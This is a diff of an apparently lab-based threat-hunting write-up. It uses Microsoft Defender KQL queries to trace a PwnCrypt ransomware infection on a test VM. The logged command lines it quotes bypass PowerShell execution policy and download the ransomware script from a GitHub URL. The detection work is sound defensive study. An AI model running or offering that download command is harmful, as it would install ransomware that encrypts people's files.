@@ -11,12 +11,14 @@ ___
 
 I searched for any files that were encrypted by the PwnCrypt ransomware by looking at logs that contained “.pwncrypt”. I found some logs that shows a PowerShell script running and shows the encrypted files’ folderpath. This suggests that the VM (windows-target-1) has been infected with the ransomware. From the logs, it looks like the encrypted files are created on the desktop, and renamed in the temp folders.
 
+```kql
 let VMname = "windows-target-1";
 DeviceFileEvents
 | where DeviceName == VMname
 | where FolderPath contains "pwncrypt"
 | order by Timestamp desc
 | project Timestamp, DeviceName, FolderPath, ActionType, InitiatingProcessCommandLine
+```
 
 ![DeviceFileEvents](images/DeviceFileEvents.png)
 ____
@@ -24,9 +26,15 @@ ____
 ## Investigation - DeviceProcessEvents
 
 I cross-referenced these findings around the same time in the DeviceProcessEvents logs. I found both cmd and powershell scripts being run. The results in the ProcessCommandLine shows that the script bypasses the execution policy, downloads the code for PwnCrypt from a URL via Invoke-WebRequest, and outputs the file as C:\programdata\pwncrypt.ps1.
+```
 "cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
-powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
+```
 
+```powershell
+powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
+```
+
+```kql
 // 2025-06-10T16:13:46.9449819Z
 let VMname = "windows-target-1";
 let specificTime = datetime(2025-06-10T16:13:46.9449819Z);
@@ -36,6 +44,7 @@ DeviceProcessEvents
 | where ProcessCommandLine contains "pwncrypt"
 | order by Timestamp desc
 | project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine
+```
 
 ![DeviceProcessEvents](images/DeviceProcessEvents.png)
 
